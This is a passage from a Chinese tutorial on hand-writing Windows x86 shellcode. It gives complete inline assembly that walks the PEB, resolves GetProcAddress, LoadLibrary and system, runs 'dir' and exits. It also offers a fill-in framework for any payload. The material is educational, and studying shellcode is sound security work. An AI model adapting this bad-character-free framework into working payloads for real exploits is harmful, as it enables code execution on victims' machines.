我们加载了msvcrt.dll库，现在我们想调用GetProcAddress来获取system函数的地址。  
这里呢，还是为了不产生坏字符，所以把字符串补够了4字节，然后删除。当然，我们也可以用低16位寄存器来存储，像上文那样。  
在这个地方，因为上面我们用了16 位寄存器，所以我们下面恢复的字节就要比完整的32位寄存器字节数少一半。
    add esp, 0x10                   ; Clean stack
    mov edx, [esp + 0x4]            ; EDX = GetProcAddress
    xor ecx, ecx                    ; ECX = 0
    push ecx                        ;73797374 656d
    mov  ecx,0x61626d65             ;emba
    push ecx
    sub dword ptr[esp + 0x3], 0x61  ; Remove “a”
    sub dword ptr[esp + 0x2], 0x62  ; Remove “b”
    push 0x74737973                 ; syst
    push esp                        ; system
    push eax                        ; msvcrt.dll address
    call edx                        ; GetProc(system)
**调用system函数**
这个地方直接就可用前文所写的代码了，直接套用进框架就行，前提是要确保堆栈平衡。
    add esp, 0x10                   ; Cleanup stack
    push ebp
    mov  ebp,esp
    sub  esp,0x4                    ; 准备空间
    xor  esi,esi
    mov  esi,0x00726964             ; dir
    mov  dword ptr[ebp-04h],esi
    lea  esi, [ebp-04h]
    push esi
    call eax                        ; system("dir")
    add esp, 0x8                    ; Clean stack
    pop esi
**得到ExitProcess函数地址**
我们完成了整个函数的执行，为了不爆出错误，我们必须完美的退出这个程序，所以我们需要在kernel32.dll中找到ExitProcess函数。
    ;退出程序
    pop edx                         ; GetProcAddress
    pop ebx                         ; kernel32.dll base address
    mov ecx, 0x61737365             ; essa
    push ecx
    sub dword ptr [esp + 0x3], 0x61 ; Remove “a”
    push 0x636f7250                 ; Proc
    push 0x74697845                 ; Exit
    push esp
    push ebx                        ; kernel32.dll base address
    call edx                        ; GetProc(Exec)
**调用ExitProcess函数**
最后，我们调用ExitProcess函数:“ExitProcess(0)”。
    xor ecx, ecx                   ; ECX = 0
    push ecx                       ; Return code = 0
    call eax                       ; ExitProcess
**完整Shellcode**
现在我们只需要把所有的代码段加在一起，最后的shellcode完整代码如下:
    void main()
    {
        _asm
        {
            xor ecx, ecx
            mov eax, fs:[ecx + 0x30] ; EAX = PEB
            mov eax, [eax + 0xc]     ; EAX = PEB->Ldr
            mov esi, [eax + 0x14]    ; ESI = PEB->Ldr.InMemOrder
            lodsd                    ; EAX = Second module
            xchg eax, esi            ; EAX = ESI, ESI = EAX
            lodsd                    ; EAX = Third(kernel32)
            mov ebx, [eax + 0x10]    ; EBX = Base address
            mov edx, [ebx + 0x3c]    ; EDX = DOS->e_lfanew
            add edx, ebx             ; EDX = PE Header
            mov edx, [edx + 0x78]    ; EDX = Offset export table
            add edx, ebx             ; EDX = Export table
            mov esi, [edx + 0x20]    ; ESI = Offset namestable
            add esi, ebx             ; ESI = Names table
            xor ecx, ecx             ; EXC = 0
        Get_Function:
            inc ecx                              ; Increment the ordinal
            lodsd                                ; Get name offset
            add eax, ebx                         ; Get function name
            cmp dword ptr[eax], 0x50746547       ; GetP
            jnz Get_Function
            cmp dword ptr[eax + 0x4], 0x41636f72 ; rocA
            jnz Get_Function
            cmp dword ptr[eax + 0x8], 0x65726464 ; ddre
            jnz Get_Function
            mov esi, [edx + 0x24]                ; ESI = Offset ordinals
            add esi, ebx                         ; ESI = Ordinals table
            mov cx, [esi + ecx * 2]              ; Number of function
            dec ecx
            mov esi, [edx + 0x1c]                ; Offset address table
            add esi, ebx                         ; ESI = Address table
            mov edx, [esi + ecx * 4]             ; EDX = Pointer(offset)
            add edx, ebx                         ; EDX = GetProcAddress
            xor ecx, ecx    ; ECX = 0
            push ebx        ; Kernel32 base address
            push edx        ; GetProcAddress
            push ecx        ; 0
            push 0x41797261 ; aryA
            push 0x7262694c ; Libr
            push 0x64616f4c ; Load
            push esp        ; "LoadLibrary"
            push ebx        ; Kernel32 base address
            call edx        ; GetProcAddress(LL)
            add esp, 0xc    ; pop "LoadLibrary"
            pop ecx         ; ECX = 0
            push eax        ; EAX = LoadLibrary
            push ecx
            mov cx, 0x6c6c  ; ll
            push ecx
            push 0x642e7472 ; rt.d
            push 0x6376736d ; msvc
            push esp        ; "msvcrt.dll"
            call eax        ; LoadLibrary("msvcrt.dll")
            ;system内存地址
            add esp, 0x10                       ; Clean stack
            mov edx, [esp + 0x4]                ; EDX = GetProcAddress
            xor ecx, ecx                        ; ECX = 0
            push ecx                            ; 73797374 656d
            mov  ecx,0x61626d65                 ; emba
            push ecx
            sub dword ptr[esp + 0x3], 0x61      ; Remove “a”
            sub dword ptr[esp + 0x2], 0x62      ; Remove “b”
            push 0x74737973                     ; syst
            push esp                            ; system
            push eax                            ; msvcrt.dll address
            call edx                            ; GetProc(system)
            add esp, 0x10         ; Cleanup stack
            ;执行核心程序
            push ebp
            mov  ebp,esp
            sub  esp,0x4
            xor  esi,esi
            mov  esi,0x00726964             ;dir
            mov  dword ptr[ebp-04h],esi
            lea  esi, [ebp-04h]
            push esi
            call eax    
            ;堆栈平衡
            add esp,0x8  ;恢复esp
            pop esi
            ;退出程序
            pop edx                         ; GetProcAddress
            pop ebx                         ; kernel32.dll base address
            mov ecx, 0x61737365             ; essa
            push ecx
            sub dword ptr [esp + 0x3], 0x61 ; Remove "a"
            push 0x636f7250                 ; Proc
            push 0x74697845                 ; Exit
            push esp
            push ebx                        ; kernel32.dll base address
            call edx                        ; GetProc(Exec)
            xor ecx, ecx                    ; ECX = 0
            push ecx                        ; Return code = 0
            call eax                        ; ExitProcess
        }
    }
具体的Shellcode提取就不做了，下面就是整个独立Shellcode的编写框架
    xor ecx, ecx
      mov eax, fs:[ecx + 0x30] ; EAX = PEB
      mov eax, [eax + 0xc]     ; EAX = PEB->Ldr
      mov esi, [eax + 0x14]    ; ESI = PEB->Ldr.InMemOrder
      lodsd                    ; EAX = Second module
      xchg eax, esi            ; EAX = ESI, ESI = EAX
      lodsd                    ; EAX = Third(kernel32)
      mov ebx, [eax + 0x10]    ; EBX = Base address
      mov edx, [ebx + 0x3c]    ; EDX = DOS->e_lfanew
      add edx, ebx             ; EDX = PE Header
      mov edx, [edx + 0x78]    ; EDX = Offset export table
      add edx, ebx             ; EDX = Export table
      mov esi, [edx + 0x20]    ; ESI = Offset namestable
      add esi, ebx             ; ESI = Names table
      xor ecx, ecx             ; EXC = 0
    Get_Function:
      inc ecx                              ; Increment the ordinal
      lodsd                                ; Get name offset
      add eax, ebx                         ; Get function name
      cmp dword ptr[eax], 0x50746547       ; GetP
      jnz Get_Function
      cmp dword ptr[eax + 0x4], 0x41636f72 ; rocA
      jnz Get_Function
      cmp dword ptr[eax + 0x8], 0x65726464 ; ddre
      jnz Get_Function
      mov esi, [edx + 0x24]                ; ESI = Offset ordinals
      add esi, ebx                         ; ESI = Ordinals table
      mov cx, [esi + ecx * 2]              ; Number of function
      dec ecx
      mov esi, [edx + 0x1c]                ; Offset address table
      add esi, ebx                         ; ESI = Address table
      mov edx, [esi + ecx * 4]             ; EDX = Pointer(offset)
      add edx, ebx                         ; EDX = GetProcAddress
      xor ecx, ecx    ; ECX = 0
      push ebx        ; Kernel32 base address
      push edx        ; GetProcAddress
      push ecx        ; 0
      push 0x41797261 ; aryA
      push 0x7262694c ; Libr
      push 0x64616f4c ; Load
      push esp        ; "LoadLibrary"
      push ebx        ; Kernel32 base address
      call edx        ; GetProcAddress(LL)
      add esp, 0xc    ; pop "LoadLibrary"
      pop ecx         ; ECX = 0
      push eax        ; EAX = LoadLibrary
      ;DLL文件字符串
      ;push 0xffffffff
      push esp        ; "xxx.dll"
      call eax        ; LoadLibrary("msvcrt.dll")
      ;查找函数内存地址
      add esp, 0xff                     ; Clean stack
      mov edx, [esp + 0x4]              ; EDX = GetProcAddress
      ;函数字符串
      ;push 0xffffffff
      push esp                              ; xxx函数
      push eax                              ; xxx.dll address
      call edx                              ; GetProc(xxx函数)
      add esp, 0xff         ; Cleanup stack
      ;执行核心程序
      ;需执行的Shellcode利用程序
      ;堆栈平衡
      add esp,0xff  ;恢复esp
      ;退出程序
      pop edx                         ; GetProcAddress
      pop ebx                         ; kernel32.dll base address
      mov ecx, 0x61737365             ; essa
      push ecx
      sub dword ptr [esp + 0x3], 0x61 ; Remove "a"
      push 0x636f7250                 ; Proc
      push 0x74697845                 ; Exit
      push esp
      push ebx                        ; kernel32.dll base address
      call edx                        ; GetProc(Exec)
      xor ecx, ecx                    ; ECX = 0
      push ecx                        ; Return code = 0
      call eax                        ; ExitProcess
### 结语
编写Shellcode只要找到方法，其实并不是很难，本文所讲也只是皮毛而已。一般一个独立性的Shellcode包含了很多，为了减小体积本文中的编写方法是可以压缩的。我们有了Shellcode独立的编写能力后，可以完成很多有趣的漏洞利用代码和独立的Shellcode的编写，或者改写他人优秀的Shellcode代码。
Linux下的Shellcode编写本文就不说了，在先知已经有朋友写过了，大体的编写思路都是一样的。  
Linux下shellcode的编写：  
以下推荐两个优秀的Shellcode工具，可转换多平台Shellcode，生成的Shellcode可能会有错误，自己调整下就行了。  
参考链接：  